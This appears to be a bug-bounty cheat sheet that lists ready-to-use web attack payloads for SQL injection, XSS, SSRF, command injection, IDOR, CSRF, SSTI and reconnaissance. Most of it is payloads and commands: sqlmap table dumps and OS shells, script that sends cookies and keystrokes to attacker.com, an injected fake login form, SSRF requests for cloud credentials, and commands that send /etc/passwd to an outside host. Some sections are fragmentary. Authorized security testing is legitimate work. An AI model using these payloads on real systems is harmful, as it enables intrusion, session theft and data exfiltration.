💉 SQL Injection (SQLi)

$$$: High Payout ▶

What: Attacker injects malicious SQL queries into input fields, URLs, or headers to manipulate the database.

1
Find injectable parameters — Look for user input: search boxes, login forms, URL params, headers, cookies, API body.
2
Test for injection — Send these basic payloads and observe errors/timeouts:
Basic Detection
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' AND SLEEP(5)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
'; WAITFOR DELAY '0:0:5'--
1' AND BENCHMARK(10000000,SHA1('test'))--
3
Identify DB type from error messages:
DB Fingerprinting
# MySQL
' AND 1=CONVERT(int,@@version)--
' UNION SELECT NULL,NULL,@@version--

# PostgreSQL
' AND 1=CAST(version AS int)--
';SELECT version()--

# MSSQL
' AND 1=convert(int,@@version)--
';WAITFOR DELAY '0:0:5'--

# Oracle
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--
4
Use sqlmap for automation:
sqlmap Commands
# Basic scan
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch --dbs

# With cookies
sqlmap -u "https://target.com/api?id=1" --cookie="session=abc123" --batch --dbs

# From Burp request file
sqlmap -r request.txt --batch --dbs

# Dump specific table
sqlmap -u "https://target.com?id=1" -D dbname -T users --dump

# Shell access
sqlmap -u "https://target.com?id=1" --os-shell

# Bypass WAF
sqlmap -u "https://target.com?id=1" --tamper=space2comment,between --random-agent --batch
5
Extract data manually (Union-based):
Union Injection
# Find column count
' ORDER BY 1--
' ORDER BY 2--
... keep going until error

# Find visible columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,NULL,NULL--
' UNION SELECT 1,2,NULL--

# Extract data
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
⚠️ Bounty tip: Blind SQLi and time-based SQLi on authenticated endpoints often pay more than error-based on public pages.

🌐 XSS (Cross-Site Scripting)

$$$: High Payout ▶

What: Injecting malicious scripts into web pages viewed by other users. Three types: Reflected, Stored, DOM-based.

1
Identify input points — URL params, form fields, HTTP headers reflected in page, URL fragments (#), postMessage handlers.
2
Test with detection payloads:
XSS Detection
# Basic detection
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>

# Event handler variants
" onmouseover=alert(1) "
' onfocus=alert(1) autofocus='
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

# Filter bypass
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror="alert(1)">
<svg><script>alert(1)</script>
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# Template literal escape
${alert(1)}
{{constructor.constructor('alert(1)')()}}

# Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
3
DOM-based XSS sources & sinks:
DOM XSS
# Sources (where attacker input comes from)
document.URL
document.documentURI
document.referrer
location.href / location.search / location.hash
window.name
postMessage data

# Sinks (where dangerous output happens)
eval()
setTimeout() / setInterval()
document.write() / document.writeln()
element.innerHTML / element.outerHTML
element.src / element.href / element.action
$.html() / $.append()
4
Exploit — Cookie theft / Session hijack:
XSS Exploitation
# Exfiltrate cookies
<script>new Image().src="https://attacker.com/c?c="+document.cookie</script>

# Keylogger
<script>document.onkeypress=function(e){new Image().src="https://attacker.com/k?k="+e.key}</script>

# Phishing — inject login form
<script>document.body.innerHTML='<h1>Session Expired</h1><form action=https://attacker.com/steal><input name=user placeholder=Email><input name=pass type=password placeholder=Password><button>Login</button></form>'</script>

# Redirect to attacker page
<script>location='https://attacker.com'%253C/script%253E</script>
💡 Bounty tip: Stored XSS on authenticated pages with PII access = $$$$$. DOM XSS via postMessage on origin-binding endpoints is also high-value.

🔗 SSRF (Server-Side Request Forgery)

$$$: Critical Payout ▶

What: Tricking the server into making requests to internal resources, cloud metadata endpoints, or other internal services.

1
Find URL-fetching features — Webhooks, file import via URL, PDF generation, URL preview, image loading, RSS feed parsing, API integrations.
2
Test basic SSRF:

http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/identity/security-credentials/ec2-instance

# Cloud metadata (GCP)
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Cloud metadata (Azure)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal services
http://127.0.0.1:8080
http://127.0.0.1:3000

http://127.0.0.1:27017   # MongoDB
http://127.0.0.1:9200    # Elasticsearch

Bypass filters:

http://0177.0.0.1          # 127.0.0.1 in octal

# IPv6

http://[0000::0001]

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31
http://127.0.0.1%2523.attacker.com   # URL parse confusion

# DNS rebinding

# Protocol tricks

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall  # Redis

Use ssrfmap or Gopherus:
SSRF Tools

ssrfmap -r request.txt -p url -m portscan

💀 RCE (Remote Code Execution)

$$$$_$: Critical Payout ▶

What: Executing arbitrary commands on the server. The most impactful web vulnerability.

1
Find command injection points — Any input that goes into system commands, file operations, or code execution.
2
Test for OS command injection:
Command Injection
# Basic injection
; id
| id
`id`
$(id)
|| id
&& id

# Blind injection (time-based)
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)

# Data exfiltration
; cat /etc/passwd
| cat /etc/passwd
; curl https://attacker.com/$(whoami)
; wget https://attacker.com/$(cat /etc/passwd | base64)

# Newline injection
%0aid
%0acat /etc/passwd

# Windows
& whoami
| whoami
&& whoami
3
Language-specific RCE:
Language-Specific RCE
# Python
__import__('os').system('id')
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Node.js
require('child_process').execSync('id')
${process.mainModule.require('child_process').execSync('id')}

# PHP
system('id');
exec('id');
`id`;
$_GET['cmd'];

# Java
Runtime.getRuntime().exec("id");

# Ruby
`id`
system("id")
⚠️ Bounty tip: RCE is almost always Critical. Even blind command injection (time-based) on a P1 program pays top dollar. Document impact clearly.

🔑 IDOR (Insecure Direct Object Reference)

$$$: High Payout ▶

What: Accessing resources by manipulating object identifiers (IDs) in API calls without proper authorization checks.

1
Map API endpoints — Look for predictable IDs in URLs, params, and API bodies: user IDs, order numbers, file paths, invoice IDs.
2
Test by changing IDs:
IDOR Testing
# Sequential IDs
GET /api/users/123 → change to /api/users/124
GET /api/invoices/456 → change to /api/invoices/457

# UUID prediction
GET /api/files/a1b2c3d4-e5f6-7890-abcd-ef1234567890

# Parameter manipulation
{"user_id": 123} → {"user_id": 124}
{"order_id": "ORD-001"} → {"order_id": "ORD-002"}

# Two-account test
1. Login as user A, note endpoint + ID
2. Login as user B, try same endpoint + ID
3. If you see user A's data = IDOR

# Encoded IDs
Base64: eyJ1c2VyX2lkIjogMTIzfQ== → {"user_id": 124}
JWT: modify payload claims
3
IDOR hunting checklist:
IDOR Checklist
□ Profile endpoints (/api/users/{id})
□ File download (/download?file=report_123.pdf)
□ Invoice/billing (/api/invoices/{id})
□ Support tickets (/api/tickets/{id})
□ Messages/notifications (/api/messages/{id})
□ Admin panels (/admin/users/{id})
□ Export endpoints (/export?user_id=123)
□ Webhook configs (/api/webhooks/{id})
□ API keys (/api/keys/{id})
High

▶

1
Identify state-changing actions — Change password, email, transfer money, update profile, delete account, add admin user.
2
Generate PoC:
CSRF PoC
<!-- Auto-submit form -->
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>

<!-- Via image tag (GET requests) -->
<img src="https://target.com/api/delete?user_id=123" style="display:none">

<!-- XMLHttpRequest -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer", true);

SSTI Detection

SSTI Exploitation

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

🔍 Recon Commands

▶
Subdomain Enumeration
# Subfinder
subfinder -d target.com -all -o subs.txt

# Amass
amass enum -passive -d target.com -o subs_amass.txt

# Assetfinder
assetfinder --subs-only target.com > subs_asset.txt

# Combine & sort
cat subs.txt subs_amass.txt subs_asset.txt | sort -u > all_subs.txt

# DNS resolution
cat all_subs.txt | dnsx -silent -a -resp-only > alive.txt

# httpx - find live hosts
cat alive.txt | httpx -silent -status-code -title -tech-detect -o live.txt
Port Scanning
# Naabu (fast port scan)
cat alive.txt | naabu -top-ports 1000 -silent -o ports.txt

# Nmap
nmap -sC -sV -p- target.com -oA nmap_full
nmap -sU --top-ports 100 target.com
Directory Bruteforcing
# Feroxbuster (recursive)
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js -o dirs.txt

# ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403

# gobuster
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js
JavaScript Analysis
# LinkFinder
python3 linkfinder.py -i https://target.com -o cli

# SecretFinder
python3 SecretFinder.py -i https://target.com/app.js -o cli

# Find interesting strings in JS
cat js_files.txt | xargs grep -lE "(api[_-]?key|secret|token|password|auth|aws|firebase)" 2>/dev/null

# Get JS files
cat live.txt | waybackurls | grep "\.js$" | sort -u > js_files.txt
URL Collection
# Wayback Machine
cat all_subs.txt | waybackurls > wayback.txt

# GAU (GetAllUrls)
cat all_subs.txt | gau --threads 5 > gau.txt

# Combine & filter
cat wayback.txt gau.txt | sort -u > all_urls.txt

# Find interesting params
cat all_urls.txt | grep "=" | sort -u > params.txt

# Find endpoints with specific extensions
cat all_urls.txt | grep -E "\.(php|asp|aspx|jsp|json|xml)" > api_endpoints.txt
